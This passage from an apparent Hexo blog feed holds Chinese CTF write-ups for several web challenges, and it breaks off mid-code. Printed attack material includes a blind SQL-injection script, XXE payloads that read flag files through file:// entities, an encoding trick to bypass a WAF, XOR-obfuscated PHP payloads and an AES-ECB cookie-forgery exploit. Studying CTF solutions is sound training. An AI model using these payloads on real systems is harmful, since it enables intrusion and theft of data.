ef40f662f589ba1f65bc5d254887ef3e51657f1614ced66938ff75182e7db1aacb5b0c4ddb69267227660328324a00a3a7190766d92607a549b5896c0e1c282dda8b16f5b50bc14beff1fb6d3759b4c80b5511cd130730d99c580455ecbacd6ba58f9690c102d4c6cb6b1623fd2893c37200e1c23e1f385c1d246592212bd47939a21f8830676a3ae8b4aecdfe157bc933dae557e130e0f806cdae816bf196bbd9c3bc28300e497a4e9811f03f343311b65023e73aa86186d4fd10edfadf27d0f89a246c519d38ec8291b50a56c4d07713be0c9f181c9d18ffc5a616f1123b539b99e286c3873d31999c6d0f00bd6828cc20ae3ac7954bcbaf3d4bbd696c92439ad27bc812d5038d3068691839e4acb34633fa4e4b1c4cae477fc8052d3adefb744b96e73159192a2166075a3b463d723da258b81a0f8c0ae4234ded2c333fa263245ed08ae9052eb6eff47a79caf62b55be08077b50862ad0af4ac1436e05b39bcbf8bedcba1d37fd3e69dd4220a7a9e63210d5c5dd4d97a627721efe2d6f021ef8f612fd9310bf87830026a185667c53affff046bbd1878e7edf8f96b5589cf6db9b2e76d4e254686a98fbc2809e47ae4fbfba1a405028399b7bbc7c0fad33f803e0abf7bf59a9fd0c3a42b2e7ecbc048a0699f4e89c69ec5e05243fb9d72aac058de9927345b6cb7fd2a14904719f0dc8f6cdebe933819f0d799b82dee5ab1939a948d93109035464e06a12083f829bdbe56ee15eb1406004945412b690937df32cd830e1075914c3284e013f751fae9e5f30c82ca844334e3fcb21a4b23d9712999c0ce048b0dfda4e0c2b8b2d3c9611f4f4fe1aaef00a361d139fba66d97b43f8831e192108bde839903323738a0a3217d6c7523d33d748269de732d69631227e2d6c0a03cf9cc0fa1f4f8c97a1e013a0b279be258f536d3075cf4ebc79d31a43d5e1374b617cbe5419500d4cd12ff12330f52546ab67edfc8316c1304aa11a5b3aa0c3d64948e298a39ecac7fd26c59d17546a165946febab85673c37f4e75f2f74af952766979c322ec8cc62e5b77bd5b7e17c8601a5366e92d56e60713df35de9020d7c8253638fe4a850ee6a2c68238f91633eb873f9f928a1c38e22a04c2e3bad763d7803b574bc6f13fd3388eaf3f3e0fc6165ac2371dd3fa169f5bc5b15107fc1f9063467d439a1c1acbe509bf1cdcdcc6de8e8a6836ba828e5cc802399ec31d339e953b4d7bdb0dc572dc4c51b410b2c45817a0e0d55761ba749afd74f2a80c69abacca7965cac5237ae707276d8e21ab4326289972b20830d166b3a18dc7283529fcc8ca4b0b5d1a5757c3e348972569850dafe7a959cbf430acc7f2241072d7b46ceeea4e3bf6f280398195f3c161ba6b2f2d6d292488492c599031ff0d192ba2f146e7e7a4fb98eab1be0918182d6c226bcc2f97a511230b1f1c286f110a4626fbf85f348f647f7b2a6e4518832a659a42fbd4bf29597f3085717f8c1012422aafb907f29409fb7b09b65f27032e52281d343b5bef8414878712169d2335c07aad8111691a848fba8fb661a097a80ba34fdb57ff2e65dca395941eaae7fb86f8d756adac18f0211fe2c1d97901e65ea9491ec4bdbf9be0c3e554b1e94bff6bb90f6a878bf1f77c8cc59b2312216632ba51b2b8dfd12f2a101c859bc3e8ab6dd30bf7f0470f380dafaa69ef9a431544889acbcf818b8b0da6a1d670599a05886a14324482f7a973df650d879ff813c7d061966f96a2f3221e2ec2b91155fe3b2d8a4462fe6b774e2b79e8af76b949ca9ce455c875ae1a7805e04e495e34455ba2d590fa8f055e2575615c79453848d4fbd7fa6552c63ea2ad0d2f177dcbf991da2c5adb0cd3ab491b88f3278b787496e47a5f0fa8c5081e66c158287bc9af13d836aa99962dabed59bc0801f83ff4a79c08bedcb81ad31f838182cbc7ee4f9e6b404cbd8021a2fff7f80aaa2a9bb309a8f23478424ba6727ff5fa63b48967fb58957195e43643bd30018790156db39b7ff4d212f4df40b11765273912ad110b6edaa4394e6070a6efe8049b1bb30150265c0c5ac744d5d3a7f539ae6274f59813abcfa06b7a045d956717ccab27108b50a71804ebeda2bc5c186b3e64a2b0de27c4b5866de621951a7ca359ee3eca737edb87ca49375e8c8ee0f222d61961734b9aaa9b3a6a6eb24575a4bd07eed7f52c74c14e524c1aef798cdce21e705b54e7cfaf18d78c0d837662574fba612fb89a0d0d27a3f0241b7ec4b1112007172a4c1c62829a2a555e5a4eb6eb6ddb6262862d4a50fb32b4e10035073330db1f7733bc8ed28a18b3c73037bec85df11da2190666a42465c6637efa63099e662d8227232fecc44704d99b066e7ee581bf0a5a5b2064eaf0d004ec5a69cd39e2aaf58393ed44dabda25bf22e8300795e88cd006a45cc72d92bebd545b713dcd15ef7f991d093f127fde517b74cdb24e507f879aae5a1eeaf33798c802afca17e35d4835488e6a664ef8114b4d57aa1420afd9758119c29692d1d75a0f54f8fb5cafbcb15412877691dd04143faaed8bd864b8500875ac8beca0521c316c39ec13de5f27e6f456d2ef6265f66c1fcd219572ec7eff357ab6f29e995a232b56c1cb74768b1170a2691aab17ab968bc949e8825d336fe5bf8482610028fdc9724dd4d799e75272a8d4d83bbe17dcabc69f303481d39a44070d4bc540ab24e5af4927c319099f4f307b641ad50190e1562eb00d14fff14b8098310450e2d84affda832878b91347ff2e62c7dd541380b7ed0fcd66771dda3b20fd5cdd2726c58a4b85ff81041ee6a3c4695a665bf12301e5965200ff20bde6c6e52cb0d7eaf7747aa8cdd74bcdfb3c2627fd0aaef4ca2143a8b7948cc5ad69a7b27fac14e389e02b2e2c7853b8590d17cf4804dce3d41b6afe5a8386e3e261f66a17457f459c180f56d9af1e2f8d63236454ece285962d5301b3d820a6a3ff3888747a192b1080dabb6c8d9937789a5fc2374bebda12e766bdd1bdc1e58723bcd610a73766db0929aa0062be84aaaa68ed090b38aba4c4e19daab80fd38acf43fb7925ef2d6e6748802abf99dad62fcf62cac53b954664bdec5426b44b3487b2ad8a1531a519093f52eb7494000924112d3cbb750503277b809f8</script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      Here&#39;s something encrypted, password is required to continue reading.
    
    </summary>
    
    
      <category term="ctfwp" scheme="http://yoursite.com/categories/ctfwp/"/>
    
    
      <category term="ISCC2020" scheme="http://yoursite.com/tags/ISCC2020/"/>
    
  </entry>
  
  <entry>
    <title>面试问题学习笔记</title>
    <link href="http://yoursite.com/2020/04/29/%E9%9D%A2%E8%AF%95%E9%97%AE%E9%A2%98%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    <id>http://yoursite.com/2020/04/29/%E9%9D%A2%E8%AF%95%E9%97%AE%E9%A2%98%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</id>
    <published>2020-04-29T00:46:46.000Z</published>
    <updated>2020-05-04T15:21:23.101Z</updated>
    
    <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">输入密码，查看文章</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="4704e7c5dac779af5f7416d717deb74888b01085319c1dce2b7e54da9b1480ee"></script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      Here&#39;s something encrypted, password is required to continue reading.
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>BUUOJ-web刷题（五）</title>
    <link href="http://yoursite.com/2020/04/28/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E4%BA%94%EF%BC%89/"/>
    <id>http://yoursite.com/2020/04/28/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E4%BA%94%EF%BC%89/</id>
    <published>2020-04-28T06:13:59.000Z</published>
    <updated>2020-05-09T15:42:25.578Z</updated>
    
    <content type="html"><![CDATA[<h3 id="0x-01-PASECA2019-honey-shop"><a href="#0x-01-PASECA2019-honey-shop" class="headerlink" title="0x 01 [PASECA2019]honey_shop"></a>0x 01 [PASECA2019]honey_shop</h3><ul><li><p>考点</p><p>SQL注入、session机制</p></li><li><p>解题过程</p></li></ul><p>在templates下的PHP文件都有一句话：<code>!isset($_SESSION) AND die(&quot;Direct access on this script is not allowed!&quot;);</code></p><p>$_SESSION数组在session_start()初始化后才产生。因此我们直接访问templates下的，$_SESSION还不存在。</p><p>与Session相关的另一个选项叫session.upload_progress.enabled，默认为On，在这个选项被打开的前提下我们在multipart POST的时候传入PHP_SESSION_UPLOAD_PROGRESS，PHP会执行session_start()（具体请参考<a href="https://www.php.net/manual/en/session.upload-progress.php" target="_blank" rel="noopener">这里</a>）。</p><p>本地测试一下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url &#x3D; &quot;http:&#x2F;&#x2F;192.168.0.8&#x2F;login.php&quot;</span><br><span class="line"></span><br><span class="line">files &#x3D; &#123;&quot;file&quot;: &quot;123456789&quot;&#125;</span><br><span class="line">a &#x3D; requests.post(url&#x3D;url, files&#x3D;files, data&#x3D;&#123;&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;: &quot;123456789&quot;&#125;,</span><br><span class="line">                  cookies&#x3D;&#123;&quot;PHPSESSID&quot;: &quot;test1&quot;&#125;,proxies&#x3D;&#123;&#39;http&#39;: &quot;http:&#x2F;&#x2F;127.0.0.1:8080&quot;&#125;)</span><br><span class="line">print(a.text)</span><br></pre></td></tr></table></figure><p>利用代理抓包发现成功执行session_start();</p><p><img src="/2020/04/28/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E4%BA%94%EF%BC%89/image-20200428142152982.png" alt></p><p>在login.php中存在SQL注入，最终payload如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;env python</span><br><span class="line">import requests</span><br><span class="line">dict &#x3D; &quot;&#123;&#125;-abcdefghijklmnopqrstuvwxyz1234567890&quot;</span><br><span class="line">flag &#x3D; &quot;&quot;</span><br><span class="line">url &#x3D; &#39;http:&#x2F;&#x2F;67fab014-d40a-4993-ba68-b765f4741a63.node3.buuoj.cn&#x2F;templates&#x2F;login.php&#39;</span><br><span class="line">files &#x3D; &#123;&quot;file&quot;:&quot;123&quot;&#125;</span><br><span class="line">data &#x3D; &#123;&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;:&quot;123&quot;&#125;</span><br><span class="line">cookies &#x3D; &#123;&quot;PHPSESSID&quot;:&quot;123&quot;&#125;</span><br><span class="line"></span><br><span class="line">for b in range(1,42):</span><br><span class="line">    for i in dict:</span><br><span class="line">        params&#x3D;&#123;&quot;username&quot;:&#39;test&quot; or (ascii(substr((select group_concat(secret) from flag_tbl),&#39;+str(b)+&#39;,1))&#x3D;&#39;+str(ord(i))+&#39;)#&#39;,&quot;password&quot;:&quot;test&quot;&#125;</span><br><span class="line">        a &#x3D; requests.post(url&#x3D;url,files&#x3D;files,data&#x3D;data,cookies&#x3D;cookies,params&#x3D;params).text</span><br><span class="line">        if &#39;meta&#39; in a:</span><br><span class="line">            print(i)</span><br><span class="line">            flag +&#x3D; i</span><br><span class="line">            break</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure><p>参考资料：</p><blockquote><p><a href="https://tiaonmmn.github.io/2019/10/08/PwnThyBytes-2019-Baby-sql-is-not-baby-anymore/" target="_blank" rel="noopener">https://tiaonmmn.github.io/2019/10/08/PwnThyBytes-2019-Baby-sql-is-not-baby-anymore/</a></p><p><a href="https://guokeya.github.io/post/N0i4q6Q4f/" target="_blank" rel="noopener">https://guokeya.github.io/post/N0i4q6Q4f/</a></p></blockquote><h3 id="0x-02-PASECA2019-honey-shop"><a href="#0x-02-PASECA2019-honey-shop" class="headerlink" title="0x 02 [PASECA2019]honey_shop"></a>0x 02 [PASECA2019]honey_shop</h3><ul><li><p>考点</p><p>lfi、flasksession安全机制</p></li><li><p>解题过程</p></li></ul><ol><li>通过图片下载功能本地文件包含读取当前进程的环境变量，获取SECRET_KEY</li></ol><p><img src="/2020/04/28/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E4%BA%94%EF%BC%89/image-20200428193139821.png" alt></p><ol start="2"><li>解密当前的session，得到<code>&#39;{&quot;balance&quot;:1336,&quot;purchases&quot;:[]}&#39;</code>，修改金额，再次加密购买得到flag</li></ol><p><img src="/2020/04/28/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E4%BA%94%EF%BC%89/image-20200428193306847.png" alt></p><p>加解密脚本：<a href="https://github.com/noraj/flask-session-cookie-manager" target="_blank" rel="noopener">https://github.com/noraj/flask-session-cookie-manager</a></p><p>需要注意的是那个脚本对Python版本有一定的限制，最好是在Python 3.6 Linux下运行。</p><p>参考资料：</p><blockquote><p><a href="https://tiaonmmn.github.io/2019/10/19/PASECACTF-2019-Honey-shop/" target="_blank" rel="noopener">https://tiaonmmn.github.io/2019/10/19/PASECACTF-2019-Honey-shop/</a></p></blockquote><h3 id="0x-03-FireshellCTF2020-Caas"><a href="#0x-03-FireshellCTF2020-Caas" class="headerlink" title="0x 03 [FireshellCTF2020]Caas"></a>0x 03 [FireshellCTF2020]Caas</h3><ul><li><p>考点</p><p>文件包含</p></li><li><p>解题过程</p></li></ul><p>题目是输入C语言代码。会给你一个编译好的可执行程序</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#include 命令告诉预处理器将指定头文件的内容插入到预处理器命令的相应位置</span><br></pre></td></tr></table></figure><p>通过包含根目录的flag报错来显示文件内容</p><p><img src="/2020/04/28/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E4%BA%94%EF%BC%89/image-20200428193819948.png" alt></p><h3 id="0x-04-GoogleCTF2019-Quals-Bnv"><a href="#0x-04-GoogleCTF2019-Quals-Bnv" class="headerlink" title="0x 04 [GoogleCTF2019 Quals]Bnv"></a>0x 04 [GoogleCTF2019 Quals]Bnv</h3><ul><li><p>考点</p><p>本地XXE</p></li><li><p>解题过程</p></li></ul><p>ubuntu系统自带<code>/usr/share/yelp/dtd/docbookx.dtd</code>文件</p><p>它定义了很多参数实体并调用,所以我们可以在内部重写一个该dtd文件中含有的参数实体,如<code>ISOmaso</code></p><p>然后在xml中。重写dtd。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE message[</span><br><span class="line">    &lt;!ENTITY % local_dtd SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;usr&#x2F;share&#x2F;yelp&#x2F;dtd&#x2F;docbookx.dtd&quot;&gt;</span><br><span class="line">    &lt;!ENTITY % ISOamso &#39;</span><br><span class="line">&lt;!ENTITY &amp;#x25; file SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;flag&quot;&gt;</span><br><span class="line">&lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:&#x2F;&#x2F;&#x2F;nonexistent&#x2F;&amp;#x25;file;&amp;#x27;&gt;&quot;&gt;</span><br><span class="line">&amp;#x25;eval;</span><br><span class="line">&amp;#x25;error;</span><br><span class="line">&#39;&gt;</span><br><span class="line">%local_dtd;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure><p><img src="/2020/04/28/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E4%BA%94%EF%BC%89/image-20200428215857519.png" alt></p><p>参考资料：</p><blockquote><p><a href="http://yugod.xmutsec.com/index.php/2019/07/14/50.html" target="_blank" rel="noopener">http://yugod.xmutsec.com/index.php/2019/07/14/50.html</a></p></blockquote><h3 id="0x-05-BSidesCF-2019-SVGMagic"><a href="#0x-05-BSidesCF-2019-SVGMagic" class="headerlink" title="0x 05 [BSidesCF 2019]SVGMagic"></a>0x 05 [BSidesCF 2019]SVGMagic</h3><ul><li><p>考点</p><p>xxe</p></li><li><p>解题过程</p></li></ul><p>svg 其实就是 xml, 所以还是 xxe,读取当前进程中的flag，payload如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE note [</span><br><span class="line">&lt;!ENTITY file SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;proc&#x2F;self&#x2F;cwd&#x2F;flag.txt&quot; &gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;svg height&#x3D;&quot;100&quot; width&#x3D;&quot;1000&quot;&gt;</span><br><span class="line">  &lt;text x&#x3D;&quot;10&quot; y&#x3D;&quot;20&quot;&gt;&amp;file;&lt;&#x2F;text&gt;</span><br><span class="line">&lt;&#x2F;svg&gt;</span><br></pre></td></tr></table></figure><p><img src="/2020/04/28/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E4%BA%94%EF%BC%89/image-20200429100043967.png" alt></p><h3 id="0x-06-CSAWQual-2019-Web-Unagi"><a href="#0x-06-CSAWQual-2019-Web-Unagi" class="headerlink" title="0x 06 [CSAWQual 2019]Web_Unagi"></a>0x 06 [CSAWQual 2019]Web_Unagi</h3><ul><li><p>考点</p><p>xxe</p></li><li><p>解题过程</p></li></ul><p>根据题目提示构造XXEpayload如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&#39;1.0&#39;?&gt;</span><br><span class="line">&lt;!DOCTYPE users [</span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;flag&quot; &gt;]&gt;</span><br><span class="line">&lt;users&gt;</span><br><span class="line">    &lt;user&gt;</span><br><span class="line">        &lt;username&gt;bob&lt;&#x2F;username&gt;</span><br><span class="line">        &lt;password&gt;passwd2&lt;&#x2F;password&gt;</span><br><span class="line">        &lt;name&gt; Bob&lt;&#x2F;name&gt;</span><br><span class="line">        &lt;email&gt;bob@fakesite.com&lt;&#x2F;email&gt;  </span><br><span class="line">        &lt;group&gt;CSAW2019&lt;&#x2F;group&gt;</span><br><span class="line">        &lt;intro&gt;&amp;xxe;&lt;&#x2F;intro&gt;</span><br><span class="line">    &lt;&#x2F;user&gt;</span><br><span class="line">&lt;&#x2F;users&gt;</span><br></pre></td></tr></table></figure><p>但是被waf掉了，可以通过编码转换绕过</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iconv -f utf8 -t utf16 simple.xml&gt;1.xml</span><br></pre></td></tr></table></figure><h3 id="0x-07-ISITDTU-2019-EasyPHP"><a href="#0x-07-ISITDTU-2019-EasyPHP" class="headerlink" title="0x 07 [ISITDTU 2019]EasyPHP"></a>0x 07 [ISITDTU 2019]EasyPHP</h3><ul><li><p>考点</p><p>特殊webshell</p></li><li><p>解题过程</p></li></ul><p>由于php的动态特性，PHP默认会把没有加引号的字符串当成常量处理，找不到对应常量就会将其解释成字符串，因此没有引号不是限制。</p><p>另外还有一点，PHP调用函数，可以使用字符串调用。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">final_string&#x3D;&quot;phpinfo&quot;</span><br><span class="line">allowed&#x3D;&quot;!#%()*+-&#x2F;:;&lt;&#x3D;&gt;?@ABCHIJKLMNQRTUVWXYZ\]^abchijklmnqrtuvwxyz&#125;~&quot;</span><br><span class="line">for a in final_string:    </span><br><span class="line">    for i in allowed:</span><br><span class="line">        for p in allowed:</span><br><span class="line">            if ord(i)^ord(p)&#x3D;&#x3D;ord(a):</span><br><span class="line">                print(&quot;i&#x3D;%s p&#x3D;%s a&#x3D;%s&quot;%(i,p,a))</span><br></pre></td></tr></table></figure><p>暴力搜索符合条件的字符串，例如：phpinfo==%8f%97%8f%96%91%99%90^%ff%ff%ff%ff%ff%ff%ff。</p><p>除了必要的<code>()^;</code>以外，我们最多剩余9个字符的空间，可以通过爆破的方式进行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">result2 &#x3D; [0x8b, 0x9b, 0xa0, 0x9c, 0x8f, 0x91, 0x9e, 0xd1, 0x96, 0x8d, 0x8c]  # Original chars,11 total</span><br><span class="line">result &#x3D; [0x9b, 0xa0, 0x9c, 0x8f, 0x9e, 0xd1, 0x96, 0x8c]  # to be deleted</span><br><span class="line">temp &#x3D; []</span><br><span class="line">for d in result2:</span><br><span class="line">    for a in result:</span><br><span class="line">        for b in result:</span><br><span class="line">            for c in result:</span><br><span class="line">                if (a ^ b ^ c &#x3D;&#x3D; d):</span><br><span class="line">                    if a &#x3D;&#x3D; b &#x3D;&#x3D; c &#x3D;&#x3D; d:</span><br><span class="line">                        continue</span><br><span class="line">                    else:</span><br><span class="line">                        print(&quot;a&#x3D;0x%x,b&#x3D;0x%x,c&#x3D;0x%x,d&#x3D;0x%x&quot; % (a, b, c, d))</span><br><span class="line">                        if d not in temp:</span><br><span class="line">                            temp.append(d)</span><br><span class="line">print(len(temp), temp)</span><br></pre></td></tr></table></figure><p>结果：<code>print_r(scandir(.));==((%9b%9c%9b%9b%9b%9b%9c)^(%9b%8f%9b%9c%9c%9b%8f)^(%8f%9e%96%96%8c%a0%9e)^(%ff%ff%ff%ff%ff%ff%ff))(((%9b%9b%9b%9b%9b%9b%9c)^(%9b%9b%9b%9c%a0%9b%8f)^(%8c%9c%9e%96%a0%96%9e)^(%ff%ff%ff%ff%ff%ff%ff))(%d1^%ff));</code></p><p><img src="/2020/04/28/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E4%BA%94%EF%BC%89/image-20200430232813996.png" alt></p><p>最后payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show_source(end(scandir(.)));&#x3D;&#x3D;((%8d%9c%97%a0%88%8d%97%8d%9c%a0%a0)^(%9a%97%9b%88%a0%9a%9b%9b%8d%9c%9a)^(%9b%9c%9c%a0%88%9b%9c%9c%9c%a0%a0)^(%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff))(((%a0%97%8d)^(%9a%9a%9b)^(%a0%9c%8d)^(%ff%ff%ff))(((%8d%a0%88%97%8d%9b%9c)^(%9a%9c%8d%9a%9b%9a%8d)^(%9b%a0%9b%9c%8d%97%9c)^(%ff%ff%ff%ff%ff%ff%ff))(%d1^%ff)));</span><br></pre></td></tr></table></figure><p>参考资料：</p><blockquote><p><a href="https://tiaonmmn.github.io/2019/07/18/ISITDTU-Easy-PHP/" target="_blank" rel="noopener">https://tiaonmmn.github.io/2019/07/18/ISITDTU-Easy-PHP/</a></p></blockquote><h3 id="0x-08-BSidesCF-2019-Mixer"><a href="#0x-08-BSidesCF-2019-Mixer" class="headerlink" title="0x 08 [BSidesCF 2019]Mixer"></a>0x 08 [BSidesCF 2019]Mixer</h3><ul><li><p>考点</p><p>AES 的 ECB 翻转攻击</p></li><li><p>解题过程</p></li></ul><p>burp设置跟随重定向  </p><p><img src="/2020/04/28/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E4%BA%94%EF%BC%89/image-20200501225143645.png" alt></p><p>根据题目的提示修改cookie发现报错，得到原文信息大致为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;first_name&quot;:&quot;xxx&quot;,&quot;last_name&quot;:&quot;xxx&quot;,&quot;is_admin&quot;:0&#125;</span><br></pre></td></tr></table></figure><p>可以推测是 ECB 加密, 如果是 CBC 的话, 前面也会变成乱码,我们知道 ECB 加密是 16 位一组, 并且每组互相独立, 加密后为 32 位,而这里的目标是让<code>is_admin</code>变成 1, 单纯的翻转的话不太好操作, 毕竟我们不知道 IV.json有个特性：<code>1.0 = 1</code></p><p>那么我们尝试构造如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;first_name&quot;:&quot;A</span><br><span class="line">1.00000000000000</span><br><span class="line">&quot;,&quot;last_name&quot;:&quot;p</span><br><span class="line">aww&quot;,&quot;is_admin&quot;:</span><br><span class="line">0&#125;</span><br></pre></td></tr></table></figure><p>所以我们可以分为5块，而加密后是以16进制表示的，所以我们需要的第二块就在<code>32-64</code>，我们把这块加在倒数第二块。第二块的值为<code>1.00000000000000</code>最后一块为0}，所以结合起来就是<code>1.000000000000000}</code>，再与之前的结合.整体就是</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;first_name&quot;:&quot;A1.00000000000000&quot;,&quot;last_name&quot;:&quot;paww&quot;,&quot;is_admin&quot;:1.000000000000000&#125;</span><br></pre></td></tr></table></figure><p>exp如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">import requests,re</span><br><span class="line">url &#x3D; &quot;http:&#x2F;&#x2F;c40cb849-de86-41c4-9b19-74e70fb66483.node3.buuoj.cn&#x2F;&quot;</span><br><span class="line">action &#x3D; &quot;&quot;&quot;?action&#x3D;login&amp;first_name&#x3D;A1.00000000000000&amp;last_name&#x3D;paww&quot;&quot;&quot;</span><br><span class="line">r &#x3D; requests.get(url + action, verify&#x3D;False, allow_redirects&#x3D;False) #取消认证和禁止重定向</span><br><span class="line">for c in r.cookies:</span><br><span class="line">    print(c.name, c.value)</span><br><span class="line">    if c.name &#x3D;&#x3D; &quot;user&quot;:</span><br><span class="line">        c.value &#x3D; c.value[:-32] + c.value[32:64] + c.value[-32:]</span><br><span class="line"></span><br><span class="line">resp &#x3D; requests.get(url, cookies&#x3D;r.cookies, verify&#x3D;False, allow_redirects&#x3D;False)</span><br><span class="line"></span><br><span class="line">print(resp.text)</span><br></pre></td></tr></table></figure><p>参考资料：</p><blockquote><p><a href="https://cjm00n.top/CTF/Buu刷题记录3.html#BSidesCF-2019-Pick-Tac-Toe" target="_blank" rel="noopener">https://cjm00n.top/CTF/Buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%953.html#BSidesCF-2019-Pick-Tac-Toe</a></p><p><a href="https://blog.csdn.net/a3320315/article/details/104335989" target="_blank" rel="noopener">https://blog.csdn.net/a3320315/article/details/104335989</a></p></blockquote><h3 id="0x-09-PyCalX-1-amp-2"><a href="#0x-09-PyCalX-1-amp-2" class="headerlink" title="0x 09 PyCalX 1&amp;2"></a>0x 09 PyCalX 1&amp;2</h3><ul><li><p>考点</p><p>布尔盲注、</p></li><li><p>解题过程</p></li></ul><ol><li>首先分析关键代码如下：</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">FLAG &#x3D; open(&#39;&#x2F;var&#x2F;www&#x2F;flag&#39;,&#39;r&#39;).read()</span><br><span class="line">source &#x3D; arguments[&#39;source&#39;].value</span><br><span class="line">def get_value(val):</span><br><span class="line">    val &#x3D; 